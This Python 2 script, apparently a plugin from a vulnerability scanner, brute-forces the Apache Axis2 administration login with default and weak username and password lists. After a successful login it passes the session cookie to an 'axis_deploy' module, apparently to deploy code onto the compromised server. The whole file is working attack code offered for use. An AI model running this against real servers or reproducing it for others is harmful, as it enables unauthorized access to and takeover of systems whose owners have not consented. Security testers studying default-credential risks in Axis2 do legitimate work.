#coding:utf-8
#author:wolf@future-sec
import urllib2
def check(host,port,timeout):
    url = "http://%s:%d"%(host,int(port))
    error_i=0
    flag_list=['Administration Page</title>','System Components','"axis2-admin/upload"','include page="footer.inc">','axis2-admin/logout']
    user_list=['axis','admin','manager','root']
    pass_list=['','axis','axis2','123456','12345678','password','123456789','admin123','admin888','admin1','administrator','8888888','123123','admin','manager','root']
    for user in user_list:
        for password in pass_list:
            try:
                login_url = url+'/axis2/axis2-admin/login'
                PostStr='userName=%s&password=%s&submit=+Login+'%(user,password)
                request = urllib2.Request(login_url,PostStr)
                res = urllib2.urlopen(request,timeout=timeout)
                res_html = res.read()
            except urllib2.HTTPError,e:
                return 'NO'
            except urllib2.URLError,e:
                error_i+=1
                if error_i >= 3:
                    return 'NO'
                continue
            for flag in flag_list:
                if flag in res_html:
                    info = '%s Axis Weak password %s:%s'%(login_url,user,password)
                    try:
                        login_cookie = res.headers['Set-Cookie']
                        deploy = __import__("axis_deploy")
                        re = deploy.run(host,port,timeout,login_cookie)
                        if re:
                            info += re
                    except Exception,e:
                        print e
                        pass
                    return 'YES|'+info
    return 'NO'
